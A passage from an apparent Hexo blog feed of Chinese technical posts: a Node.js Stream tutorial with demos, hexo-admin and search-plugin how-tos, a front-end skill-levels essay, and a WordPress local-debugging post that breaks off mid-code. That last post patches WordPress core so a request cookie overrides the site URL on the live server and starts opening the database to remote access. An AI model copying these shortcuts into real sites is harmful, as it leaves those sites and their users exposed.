class="variable language_">this</span>.<span class="property">dataSource</span>.<span class="title function_">makeData</span>();</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">push</span>(data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟资源池</span></span><br><span class="line"><span class="keyword">const</span> dataSource = &#123;</span><br><span class="line">  <span class="attr">data</span>: <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">10</span>).<span class="title function_">fill</span>(<span class="string">&#x27;-&#x27;</span>),</span><br><span class="line">  <span class="comment">// 每次读取时 pop 一个数据</span></span><br><span class="line">  <span class="title function_">makeData</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!dataSource.<span class="property">data</span>.<span class="property">length</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> dataSource.<span class="property">data</span>.<span class="title function_">pop</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> myReadable = <span class="keyword">new</span> <span class="title class_">MyReadable</span>(dataSource);</span><br><span class="line">myReadable.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">myReadable.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(chunk);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>另外一种模式是 <code>Non-Flowing Mode</code>，没流动，也就是暂停模式，这是 Stream 的预设模式，Stream 实例的 <code>_readableState.flow</code> 有三个状态，分别是：</p><ul><li><code>_readableState.flow = null</code>，暂时没有消费者过来</li><li><code>_readableState.flow = false</code>，主动触发了 <code>.pause()</code></li><li><code>_readableState.flow = true</code>，流动模式</li></ul><p>当我们监听了 onreadable 事件后，会进入这种模式，比如：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myReadable = <span class="keyword">new</span> <span class="title class_">MyReadable</span>(dataSource);</span><br><span class="line">myReadable.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">myReadable.<span class="title function_">on</span>(<span class="string">&#x27;readable&#x27;</span>, <span class="function">() =&gt;</span> &#123;&#125;);</span><br></pre></td></tr></table></figure><p>监听 <code>readable</code> 的回调函数第一个参数不会传递内容，需要我们通过 <code>myReadable.read()</code> 主动读取，为啥呢，可以看看下面这张图：</p><p><img src="/../blogimgs/2017/06/06/node-stream-non-flowing.png" alt="node-stream-non-flowing"></p><p>资源池会不断地往缓存池输送数据，直到 highWaterMark 阈值，消费者监听了 readable 事件并不会消费数据，需要主动调用 <code>.read([size])</code> 函数才会从缓存池取出，并且可以带上 size 参数，用多少就取多少：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> myReadable = <span class="keyword">new</span> <span class="title class_">MyReadable</span>(dataSource);</span><br><span class="line">myReadable.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf8&#x27;</span>);</span><br><span class="line">myReadable.<span class="title function_">on</span>(<span class="string">&#x27;readable&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> chunk;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">null</span> !== (chunk = myReadable.<span class="title function_">read</span>())) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Received <span class="subst">$&#123;chunk.length&#125;</span> bytes of data.`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里需要注意一点，只要数据达到缓存池都会触发一次 readable 事件，有可能出现「消费者正在消费数据的时候，又触发了一次 readable 事件，那么下次回调中 read 到的数据可能为空」的情况。我们可以通过 <code>_readableState.buffer</code> 来查看缓存池到底缓存了多少资源：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> once = <span class="literal">false</span>;</span><br><span class="line">myReadable.<span class="title function_">on</span>(<span class="string">&#x27;readable&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(myReadable.<span class="property">_readableState</span>.<span class="property">buffer</span>.<span class="property">length</span>);</span><br><span class="line">  <span class="keyword">if</span> (once) <span class="keyword">return</span>;</span><br><span class="line">  once = <span class="literal">true</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(myReadable.<span class="title function_">read</span>());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面的代码我们只消费一次缓存池的数据，那么在消费后，缓存池又收到了一次资源池的 push 操作，此时还会触发一次 readable 事件，我们可以看看这次存了多大的 buffer。</p><p>需要注意的是，buffer 大小也是有上限的，默认设置为 16kb，也就是 16384 个字节长度，它最大可设置为 8Mb，没记错的话，这个值好像是 Node 的 new space memory 的大小。</p><p>上面介绍了 Readable Stream 大概的机制，还有很多细节部分没有提到，比如 <code>Flowing Mode</code> 在不同 Node 版本中的 Stream 实现不太一样，实际上，它有三个版本，上面提到的是第 2 和 第 3 个版本的实现；再比如 <code>Mixins Mode</code> 模式，一般我们只推荐（允许）使用 ondata 和 onreadable 的一种来处理 Readable Stream，但是如果要求在 <code>Non-Flowing Mode</code> 的情况下使用 ondata 如何实现呢？那么就可以考虑 <code>Mixins Mode</code> 了。</p><h3 id="Writable-Stream"><a href="#Writable-Stream" class="headerlink" title="Writable Stream"></a>Writable Stream</h3><p>原理与 Readable Stream 是比较相似的，数据流过来的时候，会直接写入到资源池，当写入速度比较缓慢或者写入暂停时，数据流会进入队列池缓存起来，如下图所示：</p><p><img src="/../blogimgs/2017/06/06/node-stream-writable.png" alt="node-stream-writable"></p><p>当生产者写入速度过快，把队列池装满了之后，就会出现「背压」，这个时候是需要告诉生产者暂停生产的，当队列释放之后，Writable Stream 会给生产者发送一个 <code>drain</code> 消息，让它恢复生产。下面是一个写入一百万条数据的 Demo：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">writeOneMillionTimes</span>(<span class="params">writer, data, encoding, callback</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> i = <span class="number">10000</span>;</span><br><span class="line">  <span class="title function_">write</span>();</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">write</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> ok = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span>(i-- &gt; <span class="number">0</span> &amp;&amp; ok) &#123;</span><br><span class="line">      <span class="comment">// 写入结束时回调</span></span><br><span class="line">      ok = writer.<span class="title function_">write</span>(data, encoding, i === <span class="number">0</span> ? callback : <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// 这里提前停下了，&#x27;drain&#x27; 事件触发后才可以继续写入  </span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;drain&#x27;</span>, i);</span><br><span class="line">      writer.<span class="title function_">once</span>(<span class="string">&#x27;drain&#x27;</span>, write);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们构造一个 Writable Stream，在写入到资源池的时候，我们稍作处理，让它效率低一点：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Writable</span> = <span class="built_in">require</span>(<span class="string">&#x27;stream&#x27;</span>).<span class="property">Writable</span>;</span><br><span class="line"><span class="keyword">const</span> writer = <span class="keyword">new</span> <span class="title class_">Writable</span>(&#123;</span><br><span class="line">  <span class="title function_">write</span>(<span class="params">chunk, encoding, callback</span>) &#123;</span><br><span class="line">    <span class="comment">// 比 process.nextTick() 稍慢</span></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      callback &amp;&amp; <span class="title function_">callback</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_">writeOneMillionTimes</span>(writer, <span class="string">&#x27;simple&#x27;</span>, <span class="string">&#x27;utf8&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;end&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>最后执行的结果是：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">drain 7268</span><br><span class="line">drain 4536</span><br><span class="line">drain 1804</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>说明程序遇到了三次「背压」，如果我们没有在上面绑定 <code>writer.once(&#39;drain&#39;)</code>，那么最后的结果就是 Stream 将第一次获取的数据消耗完变结束了程序。</p><h3 id="pipe"><a href="#pipe" class="headerlink" title="pipe"></a>pipe</h3><p>了解了 Readable 和 Writable，pipe 这个常用的函数应该就很好理解了，</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">readable.<span class="title function_">pipe</span>(writable);</span><br></pre></td></tr></table></figure><p>这句代码的语意性很强，readable 通过 pipe（管道）传输给 writable，pipe 的实现大致如下（伪代码）：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Readable</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">pipe</span> = <span class="keyword">function</span>(<span class="params">writable, options</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">chunk</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> ok = writable.<span class="title function_">write</span>(chunk);</span><br><span class="line">    <span class="comment">// 背压，暂停</span></span><br><span class="line">    !ok &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">pause</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">  writable.<span class="title function_">on</span>(<span class="string">&#x27;drain&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 恢复</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">resume</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// 告诉 writable 有流要导入</span></span><br><span class="line">  writable.<span class="title function_">emit</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="variable language_">this</span>);</span><br><span class="line">  <span class="comment">// 支持链式调用</span></span><br><span class="line">  <span class="keyword">return</span> writable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面做了五件事情：</p><ul><li><code>emit(pipe)</code>，通知写入</li><li><code>.write()</code>，新数据过来，写入</li><li><code>.pause()</code>，消费者消费速度慢，暂停写入</li><li><code>.resume()</code>，消费者完成消费，继续写入</li><li><code>return writable</code>，支持链式调用</li></ul><p>当然，上面只是最简单的逻辑，还有很多异常和临界判断没有加入，具体可以去看看 Node 的代码（ <a href="https://github.com/nodejs/node/blob/master/lib/_stream_readable.js#L541-L684">&#x2F;lib&#x2F;_stream_readable.js</a>）。</p><h3 id="Duplex-Stream"><a href="#Duplex-Stream" class="headerlink" title="Duplex Stream"></a>Duplex Stream</h3><p>Duplex，双工的意思，它的输入和输出可以没有任何关系，</p><p><img src="/../blogimgs/2017/06/06/node-stream-duplex.png" alt="Node-Stream-Duplex"></p><p>Duplex Stream 实现特别简单，不到一百行代码，它继承了 Readable Stream，并拥有 Writable Stream 的方法（<a href="https://github.com/nodejs/node/blob/master/lib/_stream_duplex.js#L31-L42">源码地址</a>）：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Readable</span> = <span class="built_in">require</span>(<span class="string">&#x27;_stream_readable&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Writable</span> = <span class="built_in">require</span>(<span class="string">&#x27;_stream_writable&#x27;</span>);</span><br><span class="line"></span><br><span class="line">util.<span class="title function_">inherits</span>(<span class="title class_">Duplex</span>, <span class="title class_">Readable</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Writable</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> v = <span class="number">0</span>; v &lt; keys.<span class="property">length</span>; v++) &#123;</span><br><span class="line">  <span class="keyword">var</span> method = keys[v];</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title class_">Duplex</span>.<span class="property"><span class="keyword">prototype</span></span>[method])</span><br><span class="line">    <span class="title class_">Duplex</span>.<span class="property"><span class="keyword">prototype</span></span>[method] = <span class="title class_">Writable</span>.<span class="property"><span class="keyword">prototype</span></span>[method];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过 options 参数来配置它为只可读、只可写或者半工模式，一个简单的 Demo：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Duplex</span> = <span class="built_in">require</span>(<span class="string">&#x27;stream&#x27;</span>).<span class="property">Duplex</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> duplex = <span class="title class_">Duplex</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// readable</span></span><br><span class="line"><span class="keyword">let</span> i = <span class="number">2</span>;</span><br><span class="line">duplex.<span class="property">_read</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">push</span>(i-- ? <span class="string">&#x27;read &#x27;</span> + i : <span class="literal">null</span>);</span><br><span class="line">&#125;;</span><br><span class="line">duplex.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="title function_">toString</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// writable</span></span><br><span class="line">duplex.<span class="property">_write</span> = <span class="keyword">function</span> (<span class="params">chunk, encoding, callback</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(chunk.<span class="title function_">toString</span>());</span><br><span class="line">  <span class="title function_">callback</span>();</span><br><span class="line">&#125;;</span><br><span class="line">duplex.<span class="title function_">write</span>(<span class="string">&#x27;write&#x27;</span>);</span><br></pre></td></tr></table></figure><p>输出的结果为：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">write</span><br><span class="line">read 1</span><br><span class="line">read 0</span><br></pre></td></tr></table></figure><p>可以看出，两个管道是相互之间不干扰的。</p><h3 id="Transform-Stream"><a href="#Transform-Stream" class="headerlink" title="Transform Stream"></a>Transform Stream</h3><p>Transform Stream 集成了 Duplex Stream，它同样具备 Readable 和 Writable 的能力，只不过它的输入和输出是存在相互关联的，中间做了一次转换处理。常见的处理有 Gzip 压缩、解压等。</p><p><img src="/../blogimgs/2017/06/06/node-stream-transform.png" alt="node-stream-transform"></p><p>Transform 的处理就是通过 <code>_transform</code> 函数将 Duplex 的 Readable 连接到 Writable，由于 Readable 的生产效率与 Writable 的消费效率是一样的，所以这里 Transform 内部不存在「背压」问题，背压问题的源头是外部的生产者和消费者速度差造成的。</p><p>关于 Transfrom Stream，我写了一个简单的 Demo：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Transform</span> = <span class="built_in">require</span>(<span class="string">&#x27;stream&#x27;</span>).<span class="property">Transform</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MAP</span> = &#123;</span><br><span class="line">  <span class="string">&#x27;Barret&#x27;</span>: <span class="string">&#x27;靖&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;Lee&#x27;</span>: <span class="string">&#x27;李&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Translate</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Transform</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">dataSource, options</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(options);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">_transform</span>(<span class="params">buf, enc, next</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> key = buf.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">const</span> data = <span class="variable constant_">MAP</span>[key];</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">push</span>(data);</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> transform = <span class="keyword">new</span> <span class="title class_">Translate</span>();</span><br><span class="line">transform.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="params">data</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="title function_">toString</span>()));</span><br><span class="line">transform.<span class="title function_">write</span>(<span class="string">&#x27;Lee&#x27;</span>);</span><br><span class="line">transform.<span class="title function_">write</span>(<span class="string">&#x27;Barret&#x27;</span>);</span><br><span class="line">transform.<span class="title function_">end</span>();</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文主要参考和查阅 Node 官网的文档和源码，细节问题都是从源码中找到的答案，如有理解不准确之处，还请斧正。关于 Stream，这篇文章只是讲述了基础的原理，还有很多细节之处没有讲到，要真正理解它，还是需要多读读文档，写写代码。</p><p>了解了这些 Stream 的内部机制，对我们后续深入理解上层代码有很大的促进作用，特别希望初学 Node 的同学花点时间进来看看。</p><p>另外，本文代码和图片可以在这里取用：<a href="https://github.com/barretlee/dive-into-node-stream">https://github.com/barretlee/dive-into-node-stream</a>。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过 admin 后台管理 hexo 博客</title>
      <link href="/blog/2017/06/04/admin-platform-manage-hexo-blog/"/>
      <url>/blog/2017/06/04/admin-platform-manage-hexo-blog/</url>
      
        <content type="html"><![CDATA[<p>用了两年的 hexo 写博客，但随着博客数量的增加，构建变得原来越耗时，写博客也是强依赖于文本编辑器，无法通过 web 实时修改，更加没办法通过手机端去修改博客的内容，这让我挺苦恼。</p><p>在纠结要不要更换成 WP&#x2F;Ghost 良久之后，我决定，还是先把 Hexo 整个体验优化一下，等以后有大把空闲时间了，再折腾迁移的事情。</p><h3 id="博客后台管理"><a href="#博客后台管理" class="headerlink" title="博客后台管理"></a>博客后台管理</h3><p>为了能够方便管理博客，我自己写过一个简单的 Blog Writer，然后配合 MakeFile 来简化流程，事实上，还是太麻烦了。在网上搜罗了一番，找到了两个博客管理后台，一个叫做 <code>hexo-hey</code>，界面还是做的挺不错的，但是呢，功能比较简单，或者说过于简单；还有一个就是我当前使用的 <code>hexo-admin</code>，其实也没多多少功能，只不过在细节上的处理稍微完善一些，而且项目活跃度也高一点，但仍然不能满足我的需求——它不支持移动端。</p><p>所以我 fork 了这个项目，对它做了一些修改，目前是可以通过移动端编辑的。在 PC 上访问这个后台，长这个样子：</p><p><img src="/../blogimgs/2017/06/04/hexo-blog-manager.png" alt="hexo-admin"></p><p>Fork 过来后，给官方提过一个 PR，貌似还没有合并，合并的那些代码主要是兼容了移动端，但是后来我又发现了它的各种 bug 和性能问题，修复后，并没有提 PR，最新的代码在这里：<a href="https://github.com/barretlee/hexo-admin">hexo-admin</a>。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>如果你要使用我修改的代码可以这么做：</p><ol><li>按照官方的方式安装 <code>hexo-admin</code></li><li>下载我修改的代码到一个文件夹，执行 <code>npm link</code>;</li><li>在 hexo 根目录下执行 <code>npm link hexo-admin</code>;</li></ol><p>把代码链接过去，我懒得给官方提 PR 了，这玩意儿我做了一些私人定制，不适合继续提 PR 了，比如 Pages 我只允许展示 <code>/pages</code> 目录下的资源。</p><p>整个后台使用 react 构建的，代码逻辑还比较清晰，喜欢折腾的同学可以在原来的代码基础上继续修改。</p><p><em>P.S. 当前这篇文章就是通过 Web 编辑的，我的 hexo 博客已经部署到阿里云了。</em></p>]]></content>
      
      
      <categories>
          
          <category> 前端杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为 Hexo 博客增加一个站内搜索</title>
      <link href="/blog/2017/06/04/hexo-search-insite/"/>
      <url>/blog/2017/06/04/hexo-search-insite/</url>
      
        <content type="html"><![CDATA[<p>这个页面的右上角就可以看到效果（如果你是通过 PC 打开的话~）。</p><p>最近两个周末在 Hexo 博客的构建上做了不少事情，我会分成几篇文章一一叙述，首先来说一说 Hexo 的一个插件 <code>hexo-generator-search</code>，利用它可以给博客增加一个站内搜索，如下图所示：</p><p><img src="/../blogimgs/2017/06/04/hexo-blog-search-plugin.png" alt="问答"></p><p>上面这个样式是我自己写的，但是用到了插件生成的 xml 文件，下面我来简述下如何安装和使用它。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>安装分为两步，首先通过 npm 将插件安装到本地：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>然后在全局（<code>_config.yml</code>）配置：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br></pre></td></tr></table></figure><ul><li><code>path</code>，生成的路径，上述配置后可以通过 <code>/search.xml</code> 访问到文件</li><li><code>field</code>，用来配置全局检索的区间，可以是 <code>post/page/all</code></li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>并不是安装好这个插件就完事儿了，这个插件做的事情只是把配置文件中提到的检索区域内容打包进 <code>search.xml</code>，剩下的工作还是需要自己来做的，我写了一个栗子，也就是本博客正在使用的效果，想偷懒的同学可以拿过去使用：</p><ul><li><a href="https://github.com/barretlee/hexo-search-plugin-snippets">hexo-search-plugin-snippets</a></li></ul><p>代码比较粗糙，也是直接从网上拿过来做了些细节改动，初始化代码引入好了之后，初始化方法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ($(<span class="string">&#x27;.local-search&#x27;</span>).<span class="title function_">size</span>() &amp;&amp; !isMobile.<span class="title function_">any</span>()) &#123;</span><br><span class="line">  $.<span class="title function_">getScript</span>(<span class="string">&#x27;path/to/search.js&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">searchFunc</span>(<span class="string">&quot;/search.xml&quot;</span>, <span class="string">&#x27;local-search-input&#x27;</span>, <span class="string">&#x27;local-search-result&#x27;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>细节问题自己去研究研究吧~</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我眼中的前端九段</title>
      <link href="/blog/2017/06/03/fe-nine/"/>
      <url>/blog/2017/06/03/fe-nine/</url>
      
        <content type="html"><![CDATA[<p>看到一篇文章，讲前端分九段，对每个段位做描述，这个描述显然不准确，<a href="http://www.talentbook.cn/main/article/view/html/id/592fd7f4a56da151298b461b?from=timeline&isappinstalled=0">《前端九段，你是哪一段？》</a></p><p><img src="/../blogimgs/2017/06/03/6c0378f8gy1fg804eumiqj20p00dw0vc.jpg" alt="围棋"><!--<source src="http://ww1.sinaimg.cn/large/6c0378f8gy1fg804eumiqj20p00dw0vc.jpg">--></p><p>前端是技术岗，是为解决公司业务而设立的工种，非要用类似围棋九段来划分能力，那也需要从更加全面的角度去切割。我也尝试划出九段，给大家参考：</p><p><strong>一段</strong></p><p>能够使用 form 表单提交数据，并通过后台处理将数据展示出来，能够实现表单数据的异步校验。能实现这个功能，基本上对 html&#x2F;js 有了基本的了解，也了解一点后端语言。</p><p><strong>二段</strong></p><p>能够搭建个人博客，将博客静态部署到 github pages，也能够动态部署到 Server，并准确对静态资源做缓存处理。能实现这个功能，基本上对 linux 简单命令和 http 相关知识有所了解，对 git 也有了一点了解。</p><p><strong>三段</strong></p><p>能够从零开始实现一个网站的前台和后台，能够良好的管理多页面的 css&#x2F;js 文件，并且掌握基本的数据库知识，熟悉一门后端语言。</p><p><strong>四段</strong></p><p>能够使用构建工具对前端代码进行编译、合并、压缩等处理，能够简单地设计一个网站的架构，并且能够对架构做持续调优。这一段位需要具备基本的工程化能力和架构能力。</p><p><strong>五段</strong></p><p>掌握网页的各种调试手段，对 Native 知识有基本了解，能够对大流量的网站做优化处理，能够考虑网页的性能优化问题，对新技术有自己的认知，熟悉掌握一门后端语言，并且了解基本的运维知识。</p><p><strong>六段</strong></p><p>在前端技术使用上可以游刃有余，能够在项目开发中担任 PM 角色，可以针对一个项目作出全面的技术方案评估，并可以良好的落地方案，能够作出准确的技术选型，了解不同工具、框架的长短处，能够带领 3~5 人进行项目开发。</p><p><strong>七段</strong></p><p>能够在团队的边界技术上有所突破，能够看到项目和团队的问题，找到解决方案，提升团队的整体水平，用技术帮助业务获得持续发展的可能。</p><p><strong>八段</strong></p><p>能够在前端的边界上有所突破，引领行业的发展。能够对前端在下一个阶段的发展作出定义。</p><p><strong>九段</strong></p><p>有资格跟「前端阿尔法狗」对战。</p><hr><p>从来没有什么固定的标准来划分前端段位，以上也只是笔者针对能力要求的一个简单划分，比如有些同学对 CSS 研究深入，在全栈和全端并没有什么的沉淀，那是不是连一段都没有呢？当然不是，在公司，只要是能够帮助业务解决问题的前端，都是好前端！</p><p>以上，如果理解有偏差，勿喷，仅供娱乐。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wordpress 本地调试</title>
      <link href="/blog/2017/05/01/wp-local-development/"/>
      <url>/blog/2017/05/01/wp-local-development/</url>
      
        <content type="html"><![CDATA[<p>最近准备把博客迁移到 Wordpress 上，在主机上部署好了 Wordpress 后，遇到了一个头疼的问题，我期望将线上的环境同步一份到本地，本地代码与服务器保持同步，本地修改后可以及时预览。</p><span id="more"></span><p>看起来是个很简单的需求，但遇到了两个问题，下面说的比较详细，供小白参考。</p><h3 id="资源引用"><a href="#资源引用" class="headerlink" title="资源引用"></a>资源引用</h3><p>Wordpress 在设置完站点 URL 和主页 URL 后，所有的资源引用都指向线上地址，比如我线上地址是 <code>112.18.3.7:3333</code>，进入后台管理页，会直接跳转到 <code>http://112.18.3.7:3333/wp-admin/</code>，根本不会进入我本地的 <code>http://localhost:8888/wp-admin</code>，原因很简单，WP 会从数据库读取这些配置信息，可以将 <code>/wp-includes/option.php</code> 中的 <code>get_option</code> 函数做一下修改：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_option</span>(<span class="params"> <span class="variable">$option</span>, <span class="variable">$default</span> = <span class="literal">false</span> </span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$BLOG_DEBUG</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;blog_debug&quot;</span>];　</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( <span class="variable">$BLOG_DEBUG</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^https?:\/\/[\w-_.:]+$/&quot;</span>, <span class="variable">$BLOG_DEBUG</span>)</span><br><span class="line">    &amp;&amp; (<span class="variable">$option</span> == <span class="string">&#x27;siteurl&#x27;</span> || <span class="variable">$option</span> == <span class="string">&#x27;home&#x27;</span>) ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$BLOG_DEBUG</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码的意思是，如果访问站点时，找到了名叫 <code>blog_debug</code> 的 cookie，则将数据库取出来的 <code>siteurl</code> 和 <code>home</code> 两个值提换成 <code>blog_debug</code> 对一个的 cookie。那么，我们只需要在本地打开的 <code>http://localhost:8888/</code> 页面中写上：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&#x27;blog_debug=http://localhost:8888&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如上，就可以完成本地调试了。</p><h3 id="远程访问数据库"><a href="#远程访问数据库" class="headerlink" title="远程访问数据库"></a>远程访问数据库</h3><p>Linux 上安装数据库，默认只允许在 <code>127.0.0.1</code> 下访问，外部是访问不了的，比如通过 <code>112.18.3.7:3306</code>，设置比较简单：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim 